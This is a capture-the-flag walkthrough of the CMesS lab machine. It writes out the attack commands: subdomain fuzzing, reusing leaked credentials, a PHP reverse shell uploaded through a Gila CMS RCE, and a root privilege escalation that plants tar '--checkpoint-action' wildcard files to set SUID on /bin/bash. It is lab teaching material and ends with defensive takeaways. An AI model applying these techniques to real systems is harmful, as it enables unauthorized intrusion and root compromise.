# CMesS CTF — Full Walkthrough

**Room:** CMesS | **Difficulty:** Medium | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.48.149.215` |
| Attack Machine | Kali Linux |
| Attack IP | `192.168.192.149` |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Gila CMS 1.10.9 authenticated RCE |
| 02 | `tar` wildcard exploit via cron job |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.149.215 -oN nmap_scan.txt
```

**Finding:** Web server running **Gila CMS 1.10.9**

### Subdomain Enumeration

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -fw 522
```

**Discovery:** `dev.cmess.thm`

---

## Phase 2: Credential Extraction

Browsing `http://dev.cmess.thm` revealed a support chat with leaked credentials:

| Field | Value |
|-------|-------|
| Email | `andre@cmess.thm` |
| Password | `KPFTN_f2yxe%` |

---

## Phase 3: Initial Foothold — Gila CMS RCE

Gila CMS 1.10.9 has an authenticated Remote Code Execution vulnerability.

1. Logged into the CMS admin panel with found credentials
2. Uploaded a PHP shell (`shell.php7`) via the CMS file manager
3. Started a listener: `nc -lvnp 4444`
4. Accessed the uploaded shell → **Reverse shell as `www-data`**

---

## Phase 4: User Flag (andre)

```bash
# Found password file
cat /opt/.password.bak
# Password: UQfsdCB7aAP6

# Switch to andre
su andre

# Read user flag
cat /home/andre/user.txt
```

---

## Phase 5: Privilege Escalation — Tar Wildcard Exploit

### Discovery

Found a root cron job running every 2 minutes:

```
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

The `tar` command uses a wildcard (`*`), which can be exploited to execute arbitrary commands.

### Exploitation

```bash
cd /home/andre/backup

# Create a script that makes /bin/bash SUID
echo '#!/bin/bash
chmod +s /bin/bash' > shell.sh

# Create files that tar interprets as command-line flags
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

When cron runs `tar -zcf ... *`, tar interprets the filenames `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as command-line options, executing `shell.sh` as root.

```bash
# After cron executes, /bin/bash has SUID bit set
/bin/bash -p
# Root shell obtained!

cat /root/root.txt
```

---

## Vulnerability Chain

1. **Subdomain enumeration** — `ffuf` discovery of `dev.cmess.thm`
2. **Information disclosure** — Credentials leaked in support chat
3. **CMS vulnerability** — Gila CMS 1.10.9 authenticated RCE
4. **Password reuse** — Found `.password.bak` with andre's password
5. **Tar wildcard exploit** — Cron job uses `*` allowing command injection via checkpoint files

## Key Takeaways

- **Always enumerate subdomains** — hidden services may contain sensitive data
- **Cron jobs with `tar *` are dangerous** — wildcards can be exploited
- **`--checkpoint` and `--checkpoint-action`** are tar features that can execute arbitrary commands
- **Never run `tar *` in user-writable directories as root**
